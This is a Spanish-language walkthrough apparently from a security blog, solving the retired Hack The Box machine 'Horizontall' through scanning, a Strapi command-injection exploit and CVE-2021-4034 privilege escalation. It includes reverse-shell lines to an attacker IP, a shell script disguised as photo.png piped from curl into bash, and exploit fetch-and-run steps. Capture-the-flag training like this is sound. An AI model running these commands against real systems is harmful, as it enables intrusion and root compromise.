En este post voy a explicar paso por paso como hacer la máquina horizontall de Hack The Box desde 0, es una máquina nivel Fácil, tiene Linux y ya está retirada

Reconocimiento>

Reconocimiento #

Para empezar lo primero es comprobar si la máquina está activa y que OS tiene

ping -c 1 10.10.11.105

En este caso da un ttl de 63

Entendiendo que ttl=64: Linux / ttl=128: Windows

Esta máquina es Linux por aproximación

Escaneo de puertos (nmap)>

Escaneo de puertos (nmap) #

Ahora empezamos con un escaneo de puertos

nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.11.105 -oG allPorts
Parámetro Función
-p- Para que el escaneo sea a todos los puertos (65536)
–open Para que solo reporte los puertos abiertos
-sS –min-rate 5000 Definir el tiempo del escaneo
-n Omitir resolución DNS
-vvv Para que vaya reportando lo que encuentre por consola
-Pn Skip host discovery
-oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPorts

Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual

Función extractPorts de @s4vitar

Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos

nmap -p22,80 -sC -sV 10.10.11.105 -oN target
Parámetro Función
-p22,80 Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior
-sC Para que realice scripts básicos de reconocimiento
-sV Proporciona la versión e información de los servicios que corren por los puertos
-oN target Para que lo guarde en el archivo target en formato nmap

Se puede observar que en el puerto 80 hay un redirect a http://horizontall.htb

Para poder abrir la web se tiene que añadir al archivo /etc/hosts una línea con:

10.10.11.105 horizontall.htb

Ejemplo:

Contenido Web>

Contenido Web #

Al entrar a la web lo primero que se ve es una página en la cual no funcionan los links

Buscar subdirectorios (wfuzz)>

Buscar subdirectorios (wfuzz) #

Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando:

wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
Parámetro Función
-c Para que lo reporte todo con colores
-t Para configurar el tiempo
–hc=404 Para que no nos reporte los subdirectorios que no existan
-w Es donde se indica el diccionario
FUZZ Se escribe donde quieres aplicar el diccionario

Solo ha encontrado 2 subdirectorios

  • js
  • css
Buscar subdominios (gobuster)>

Buscar subdominios (gobuster) #

Con gobuster podemos buscar subdominios con el siguiente comando

gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u horizontall.htb

Encontramos un subdominio llamado api-prod.horizontall.htb, otra forma de haberlo encontrado sin el gobuster es dandole a inspeccionar y después entrando al Depurador y ahí se puede ver que hay 2 js

El chunk-vendors.js, como su nombre lo dice, es un paquete para todos los módulos que no son tuyos, sino de otras partes. Se denominan módulos de terceros o módulos de proveedores.

En cambio, el app.c68eb462.js tiene un nombre raro, al abrirlo, ( http://horizontall.htb/js/app.c68eb462.js) sale mucho texto, pero si se filtra por ejemplo .htb, podemos ver un subdominio:

http://api-prod.horizontall.htb

Para poder entrar a la web se tiene que añadir el subdominio al /etc/hosts como hicimos anteriormente de tal forma que quede así:

10.10.11.105 horizontall.htb api-prod.horizontall.htb

Al entrar al api solo vemos una página en blanco con un título que pone welcome

Explotación de Vulnerabilidades>

Explotación de Vulnerabilidades #

Ahora ya sabemos una vulnerabilidad (strapi), strapi es un CMS de código abierto basado en Node.js que te permite crear una API y gestionar su contenido

De los 2 exploits que reporto el serachsploit vamos a usar el que está hecho con python, lo pasamos al directorio actual y después lo ejecutamos

searchsploit -m 50239.py
Ejecutar Exploit>

Ejecutar Exploit # 

python3 50239.py http://api-prod.horizontall.htb

Eso nos va a abrir una inyección de comandos en la cual no podemos ver la respuesta.

Reverse shell>

Reverse shell #

  1. Primero nos ponemos en escucha por el puerto 443 con netcat

    nc -nlvp 443

  2. Probamos a crear la reverse shell

    bash -i >& /dev/tcp/10.10.14.19/443 0>&1

    No recibimos nada, Probamos añadiendo el bash -c

    bash -c "bash -i >& /dev/tcp/10.10.14.19/443 0>&1"

    Tampoco la pilla, vamos a probar de crear un archivo .png con el comando de bash para la reverse shell, después con un curl lo vamos a mandar a la máquina a través de un servidor creado con python para que después lo ejecute con bash

    Contenido de photo.png

    #!/bin/bash

bash -i >& /dev/tcp/10.10.14.19/443 0>&1

    Abrimos un servidor con python por el puerto 80

    python3 -m http.server 80

    Por último, en la inyección de comandos que nos dio el exploit, hacemos un curl

    curl http://10.10.14.19/photo.png | bash

con un ifconfig confirmamos que estamos en la 10.10.11.105

¡Ya tenemos una reverse shell!

Tratamiento de la tty>

Tratamiento de la tty #

script /dev/null -c bash

export TERM=xterm

Flag Root>

Flag Root #

Después de buscar un rato, he encontrado que es vulnerable a https://github.com/berdav/CVE-2021-4034

Los pasos para ejecutarlo son:

Clonar el repositorio de github en nuestra máquina

git clone https://github.com/berdav/CVE-2021-4034

Lo comprimimos

zip -r CVE-2021-4034

Desde la máquina víctima y usando el mismo servidor con python de antes lo pasamos con wget

wget http://10.10.14.19:80/CVE-2021-4034.zip

unzip CVE-2021-4034.zip

cd CVE-2021-4034

make

./cve-2021-4034

Si hacemos un whoami ya somos root!!!

Para ver la flag hacemos un cat al root.txt

cat /root/root.txt

¡¡¡Máquina resuelta!!!
